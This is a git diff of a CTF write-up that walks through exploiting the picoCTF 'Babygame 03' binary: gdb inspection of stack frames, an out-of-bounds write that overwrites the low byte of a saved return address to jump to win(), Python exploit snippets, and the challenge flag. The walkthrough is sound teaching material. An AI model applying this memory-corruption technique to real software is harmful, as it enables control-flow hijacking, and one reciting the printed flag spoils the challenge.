@@ -3484,7 +3484,7 @@ def solve():
 
         # {-7, 0}
 
-    def reset_live():
+    def reset():
         """
         Reset the co-ordinates to (4, 4)
         """
@@ -3494,13 +3494,191 @@ def solve():
     get_lives()
 ```
 
-Btw we are basically taking advantage of the fact that it will update the previous location of the map to the current player tile character to get larger lives
+Btw we are just basically taking advantage of the fact that it will update the previous location of the map to the current player tile character to get larger lives
 
 Now after that we can get large lives
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d1b7b9a9-7b1f-458c-9c7a-976e0df32402)
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2c194a64-8177-4a1c-b696-8aa1480c7fae)
 
+With that we can move around the map freely what next?
 
+Back to the main function we know that we need a way to increment the level and i but as of now that is impossible because of the logic that handles it
+
+Ok i won't say totally impossible because we are going to bypass this 
+
+One thing we should know is that when a function is called it creates a stack frame, and then when it's about to return the next instruction of the function which it was called from would be placed in the instruction pointer which then makes the program returns from the current function
+
+Let's take this as example:
+
+```
+Dump of assembler code for function main:
+   0x08049927 <+182>:   call   0x8049533 <move_player>
+   0x0804992c <+187>:   add    esp,0x10
+
+
+Dump of assembler code for function move_player:
+   0x08049533 <+0>:     push   ebp
+   0x08049534 <+1>:     mov    ebp,esp
+   0x08049536 <+3>:     push   esi
+   0x08049537 <+4>:     push   ebx
+   0x08049538 <+5>:     sub    esp,0x10
+   ........... instructions ----------
+   0x0804969c <+361>:   pop    ebx
+   0x0804969d <+362>:   pop    esi
+   0x0804969e <+363>:   pop    ebp
+   0x0804969f <+364>:   ret
+```
+
+From the main function, when it calls `move_player` it would store the next instruction which is `add esp, 0x10` to the stack
+
+Then function `move_player` would create a new stack frame and after it does whatever it wants to do, it would then set `esp` to the next instruction which is in main i.e `add esp, 0x10`
+
+Ok let's just test this out for you to see
+
+In gdb i'll set a breakpoint at this following places:
+
+```
+- main+182
+- move_player+361
+```
+
+Starting the process and using `w` hits the first breakpoint
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8cde45da-789c-4b36-996f-9879bf294362)
+
+We can see that the stack is still it's normal value but once we step into this function we get this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d470f667-2844-42fb-8b8b-a569b7fc834c)
+
+Cool we see that the stack address `0xffffc3ac` is pointing to the next instruction in main
+
+At this point `move-player` would create a new stack frame, on continuing the process we should hit the last breakpoint
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bc918b73-2fa7-4252-8ec9-5f3e546285ba)
+
+Currently the stack frame instruction pointer is not yet placed into esp, but we can tell that after it does the three pop instruction the next value which is at the top of the stack would be the instruction which was placed on the stack `add esp, 0x10`
+
+So we use `ni` thrice we get this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/052f1a0d-0942-470e-ba94-5f79ea8782cd)
+
+We can see that when it's about to return it would return to the address currently placed on the stack
+
+With that said how exactly do we take advantage of this?
+
+While we are in function `move_player` we can overwrite the lsb of the stack frame eip address
+
+Meaning we can control the flow of the program execution with just "a byte"
+
+Even though it's a byte we can't just freely move anywhere in memory but rather we can move any where in `main`
+
+Ok with that said where would we want to jump to in main?
+
+Because of this condition we can't set our level to 5 and i to 1
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f1dcb153-721a-43ee-a6d8-26ba39a96a1d)
+
+So instead of the move_player returning to main and continuing the control flow we can rather return here
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9f5998a7-7ca1-453e-b6a8-583e05673812)
+
+This means that instead of `move_player` to return to `0x804992c` we can overwrite the lsb of the stack frame eip therefore making it return to `0x804997a`
+
+Now that would bypass the comparism and if we do that 4 times our live would be set to 5 and i set to 4
+
+Ok we have an exploit plan how do we go about it?
+
+First we need to get the offset of `map --> stack_frame (eip)`
+
+To get the stack frame eip we can just gdb `info frame` command to view the stack frame
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cdfd3b36-18cf-4801-93ca-d7892ec0e043)
+
+We can just easily subtract it
+
+```
+map = 0xffffc3ef
+eip = 0xffffc3bc
+offset = eip - map
+= 0xffffc3bc - 0xffffc3ef
+= -51
+
+map[-51] == eip (stack frame)
+```
+
+To get to this offset we need to set `x` to `-55` and `y` to `0` 
+
+It's `(0, -55)` because i will return to my initial coordinate back (4, 4) before attempting to move to `map[-51]`
+
+Ok but what do we overwrite it with?
+
+Remember that we have a function that can allow us change the player tile character and that's accessed using `l`
+
+In this case I'll change the character to `0x7a` and then when it overwrites the lsb it should point to `main+265 == 0x0804997a`
+
+You might wonder, won't the lsb get overwritten with a `.` ?
+
+Well normally that would be the case once we move around the map after overwritting the lsb but this time around after we overwrite the stack frame instruction pointer we won't move around the map but rather let the program continue it's execution and therefore it would basically reset the map and the players structure
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d15bb107-f0b1-42e6-8b98-9fb7996bbeba)
+
+Doing that works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b99814a8-83bc-41b9-9ced-0dbc81df15df)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/152ef900-d5c0-4b4c-8006-728ad6405e76)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2dcc4a33-a588-4af4-b613-19a9b413a3d3)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d7d3fe49-564b-4d1e-97f2-0946e3d0c4f2)
+
+```python
+for _ in range(5):
+    get_lives()
+    reset()
+    change_tile_character(p8(0x7a))
+    send_movement(player, b'a'*55)
+    send_movement(player, b'w'*4)
+```
+
+Ok now we have everything needed but when we then choose `p` which solves the map we don't break out of the loop?
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7b658d8d-bbbf-4e8a-9b3b-49859600f762)
+
+We can see that it rather increments our live value
+
+How do we avoid this and instead get the flag?
+
+Well to do this rather than us jumping to `0x0804997a` we can jump to few instructions before it calls `win()`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/935f8685-7381-4ddf-9bec-f5990987517c)
+
+In my case I choose to jump here `0x80499e5`
+
+Here's how to do it:
+- Increment the level by 4 and i should be set to 3
+- On the 4th oob write we set the stack frame instruction pointer to `0xe5`
+- When we then trigger the write our level is going to be 5 and then it calls win!
+
+Here's it
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ad977937-1fb1-4a3d-be26-ddb8e2b8c0f8)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8b1c30ca-61dc-47d2-bf35-58cafec7c38d)
+
+```python
+    for _ in range(4):
+        get_lives()
+        reset()
+        change_tile_character(p8(0x7a))
+        send_movement(player, b'a'*55)
+        send_movement(player, b'w'*4)
+
+    get_lives()
+    reset()
+    io.send(b'l'+p8(0xe5))
+    send_movement(player, b'a'*55)
+    send_movement(player, b'w'*4)
+```
+
+But trying that remotely doesn't work when i initially solved it
+
+Though it seems to work now
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2457d19e-592b-42a2-9809-25b61dc2886a)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/00969e86-1fe0-48a7-8d07-6a1c7d9fdf09)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4d3f6243-d064-4fe5-a616-5830417b7af2)
+
+During the ctf it didn't work so instead i fuzzed for the right offset to overwrite and that got me the flag too
+
+Here's my full solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Babygame%2003/solve.py)
+
+```
+Flag: picoCTF{gamer_leveluP_fb9b377c}
+```
 
 
 
